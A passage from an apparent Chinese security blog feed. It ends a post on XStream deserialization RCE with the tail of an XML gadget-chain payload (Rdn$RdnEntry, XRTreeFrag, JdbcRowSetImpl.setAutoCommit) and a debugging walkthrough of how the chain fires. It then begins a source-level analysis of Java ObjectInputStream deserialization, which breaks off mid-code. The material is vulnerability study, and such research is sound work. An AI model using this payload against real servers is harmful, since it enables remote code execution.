class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">'../fConfigSetInput'</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XString'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">'string'</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>调试：</p><p><code>&lt;sorted-set&gt;</code>是最外层的对象，内部包含着两个<code>javax.naming.ldap.Rdn$RdnEntry</code>成员。</p><p>那么在第二个<code>RdnEntry</code>成员加入到<code>sorted-set</code>的时候，会调用<code>Rdn$RdnEntry.compareTo</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809182816307.png" alt="image-20210809182816307" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809183547832.png" alt="image-20210809183547832" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809183614947.png" alt="image-20210809183614947" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809183210279.png" alt="image-20210809183210279" style="zoom:50%;"><p>这里<code>m_DTMXRTreeFrag.getDTM()</code>实际上获取<code>SAX2DTM</code>对象，之后调用<code>SAX2DTM#getStringvalue</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184332065.png" alt="image-20210809184332065" style="zoom:50%;"><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184400149.png" alt="image-20210809184400149" style="zoom:50%;"><p>来到<code>nextNode()</code>方法：</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184459982.png" alt="image-20210809184459982" style="zoom:50%;"><p>该方法中调用了<code>m_incrementalSAXSource</code>属性也就是POC中封装好的<code>IncrementalSAXSource_Xerces</code>对象的<code>deliverMoreNodes</code>方法。</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184632899.png" alt="image-20210809184632899" style="zoom:50%;"><p>接下来分别执行：<code>IncrementalSAXSource_Xerces.java:312</code> 来到<code>IncrementalSAXSource_Xerces.parseSome</code>方法</p><img src="../images/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A2%B3%E7%90%86/image-20210809184856456.png" alt="image-20210809184856456" style="zoom:50%;"><p>其中这里<code>fConfigParse</code>、<code>fPullParserConfig</code>、<code>parmsfalse</code> 都可控，之后该方法会通过反射调用JdbcRowSetImpl.setAutoCommit方法，结合JdbcRowSetImpl攻击。 </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.jianshu.com/p/387c568faf62" target="_blank" rel="noopener"> XStream源码解析</a></p><p><a href="https://www.cnblogs.com/v1ntlyn/p/14034019.html" target="_blank" rel="noopener">1</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;百川东到海，何时复西归？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这一篇来梳理XStream不同版本的花式RCE，也会是补全计划的一部分。    &lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="XStream" scheme="https://0range228.github.io/tags/XStream/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化流程梳理</title>
    <link href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-17T03:24:19.000Z</published>
    <updated>2021-07-17T07:44:44.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>梳理Java反序列化流程。</p><p>参考<a href="https://www.cnpanda.net/" target="_blank" rel="noopener">panda</a>师傅。</p><a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>有了前两篇<a href="https://0range228.github.io/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/">序列化协议</a>、<a href="https://0range228.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/">序列化流程梳理</a>作为学习基础，反序列化操作就好理解多了。</p><p>我们知道序列化的核心原理：</p><blockquote><p>创建一个ObjectOutputStream输出流，调用</p><p>流对象的writeObject方法，将对象序列化保存。</p></blockquote><p>那么其实反序列化就是对称的：</p><blockquote><p>创建一个ObjectInputStream输入流，调用ois流对象的readObject方法，将内容还原为内存中的对象。</p></blockquote><h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><p>老规矩 还是先上demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">2L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(String name, <span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"10range.ser"</span>));</span><br><span class="line">        Student o = (Student)ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心还是两句话：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"10range.ser"</span>));</span><br><span class="line">Student o = (Student)ois.readObject();</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>看<code>ObjectInputStream</code>的构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        verifySubclass();</span><br><span class="line">        bin = <span class="keyword">new</span> BlockDataInputStream(in);</span><br><span class="line">        handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>);</span><br><span class="line">        vlist = <span class="keyword">new</span> ValidationList();</span><br><span class="line">        serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line">        enableOverride = <span class="keyword">false</span>;</span><br><span class="line">        readStreamHeader();</span><br><span class="line">        bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和序列化一样，同样先是<code>verifySubclass()</code>查看是否可以在不违反安全约束的情况下构造此实例。</p><p>四个全局变量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** filter stream for handling block data conversion */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> BlockDataInputStream bin;</span><br><span class="line"><span class="comment">/** validation callback list */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ValidationList vlist;</span><br><span class="line"><span class="comment">/** wire handle -&gt; obj/exception map */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> HandleTable handles;</span><br><span class="line"><span class="comment">/** if true, invoke readObjectOverride() instead of readObject() */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> enableOverride;</span><br></pre></td></tr></table></figure><p>在oos里面的bout，ois里面则是bin，作用是对称的。</p><p>比较特殊的是：</p><p><code>visit</code>是一个用来提供<code>CallBack</code>操作的验证集合</p><p>几个全局变量初始化之后：</p><p><code>readStreamHeader();</code>：读取序列化文件的头部，验证魔数和序列化版本是否匹配</p><p><code>bin.setBlockDataMode(true);</code>：设置为块数据读取模式</p><h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h2><p>当public构造函数执行完毕之后，就该执行<code>readObject</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">        <span class="keyword">return</span> readObjectOverride();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if nested read, passHandle contains handle of enclosing object</span></span><br><span class="line">    <span class="keyword">int</span> outerHandle = passHandle;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object obj = readObject0(<span class="keyword">false</span>);</span><br><span class="line">        handles.markDependency(outerHandle, passHandle);</span><br><span class="line">        ClassNotFoundException ex = handles.lookupException(passHandle);</span><br><span class="line">        <span class="keyword">if</span> (ex != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">            vlist.doCallbacks();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        passHandle = outerHandle;</span><br><span class="line">        <span class="keyword">if</span> (closed &amp;&amp; depth == <span class="number">0</span>) &#123;</span><br><span class="line">            clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，也是把主要操作交给了<strong>readObject</strong>方法来完成。</p><h3 id="readObject0"><a href="#readObject0" class="headerlink" title="readObject0"></a>readObject0</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Underlying readObject implementation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readObject0</span><span class="params">(<span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> oldMode = bin.getBlockDataMode();</span><br><span class="line">    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">        <span class="keyword">int</span> remain = bin.currentBlockRemaining();</span><br><span class="line">        <span class="keyword">if</span> (remain &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(remain);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (defaultDataEnd) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Fix for 4360508: stream is currently at the end of a field</span></span><br><span class="line"><span class="comment">             * value block written via default serialization; since there</span></span><br><span class="line"><span class="comment">             * is no terminating TC_ENDBLOCKDATA tag, simulate</span></span><br><span class="line"><span class="comment">             * end-of-custom-data behavior explicitly.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span> tc;</span><br><span class="line">    <span class="comment">//从序列化信息中获取第一个字节</span></span><br><span class="line">    <span class="keyword">while</span> ((tc = bin.peekByte()) == TC_RESET) &#123;</span><br><span class="line">        bin.readByte();</span><br><span class="line">        handleReset();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    depth++;</span><br><span class="line">    totalObjectRefs++;</span><br><span class="line">    <span class="comment">// 如果是对象的序列化，tc=0x73,也就是TC_OBJECT，</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">            <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                <span class="keyword">return</span> readNull();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_REFERENCE: <span class="comment">// handle</span></span><br><span class="line">                <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                <span class="keyword">return</span> readClass(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_STRING:</span><br><span class="line">            <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_OBJECT: <span class="comment">// Object</span></span><br><span class="line">                <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                IOException ex = readFatalException();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> WriteAbortedException(<span class="string">"writing aborted"</span>, ex);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">            <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                    bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(</span><br><span class="line">                        bin.currentBlockRemaining());</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                        <span class="string">"unexpected block data"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> OptionalDataException(<span class="keyword">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                        <span class="string">"unexpected end of block data"</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> StreamCorruptedException(</span><br><span class="line">                    String.format(<span class="string">"invalid type code: %02X"</span>, tc));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        depth--;</span><br><span class="line">        bin.setBlockDataMode(oldMode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里匹配到这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">      <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br></pre></td></tr></table></figure><h3 id="readOrdinaryObject"><a href="#readOrdinaryObject" class="headerlink" title="readOrdinaryObject"></a>readOrdinaryObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Reads and returns "ordinary" (i.e., not a String, Class,</span></span><br><span class="line"><span class="comment"> * ObjectStreamClass, array, or enum constant) object, or null if object's</span></span><br><span class="line"><span class="comment"> * class is unresolvable (in which case a ClassNotFoundException will be</span></span><br><span class="line"><span class="comment"> * associated with object's handle).  Sets passHandle to object's assigned</span></span><br><span class="line"><span class="comment"> * handle.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">readOrdinaryObject</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//首先再次确认TC_OBJECT，不是的话直接报错</span></span><br><span class="line">    <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//读取当前类的类描述符号</span></span><br><span class="line">    ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>);</span><br><span class="line">  <span class="comment">//检查是否可以反序列化</span></span><br><span class="line">    desc.checkDeserialize();</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl == String<span class="class">.<span class="keyword">class</span> || <span class="title">cl</span> </span>== Class<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class">            || <span class="title">cl</span> </span>== ObjectStreamClass<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">            desc.forClass().getName(),</span><br><span class="line">            <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">    ClassNotFoundException resolveEx = desc.getResolveException();</span><br><span class="line">    <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">        handles.markException(passHandle, resolveEx);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (desc.isExternalizable()) &#123;</span><br><span class="line">        readExternalData((Externalizable) obj, desc);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        readSerialData(obj, desc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    handles.finish(passHandle);</span><br><span class="line"></span><br><span 